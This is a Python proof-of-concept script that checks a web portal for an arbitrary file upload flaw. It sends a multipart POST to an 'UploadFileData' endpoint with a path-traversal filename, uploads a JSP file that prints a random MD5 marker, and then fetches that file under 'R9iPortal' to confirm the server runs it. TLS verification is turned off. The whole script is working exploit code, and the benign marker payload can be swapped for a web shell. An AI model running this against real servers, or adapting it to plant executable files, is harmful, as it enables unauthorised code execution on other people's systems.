import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r=randomLowercase(16)
r1=md5(str(r).encode()).hexdigest()

def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randomFilename=randomLowercase(6)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
randomBoundary=randomLowercase(8)
def doCheck(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"UploadFileData?action=upload_file&filename=../."+randomFilename+".jsp"
	body='''------WebKitFormBoundary'''+randomBoundary+'''\r
Content-Disposition: form-data; name="upload"; filename="'''+randomFilename+'''.jsp"\r
Content-Type: application/octet-stream\r
\r
<% {out.print("'''+r1+'''");} %>\r
------WebKitFormBoundary'''+randomBoundary+'''\r
Content-Disposition: form-data; name="submit"\r
\r
submit\r
------WebKitFormBoundary'''+randomBoundary+'''--'''
	headers={'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'+randomBoundary}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "showSucceedMsg" in response.text:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"R9iPortal/."+randomFilename+".jsp"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and r1 in response.text:
		r11=True
	else:
		r11=False
	if r0 and r11:
		return True
	else:
		return False
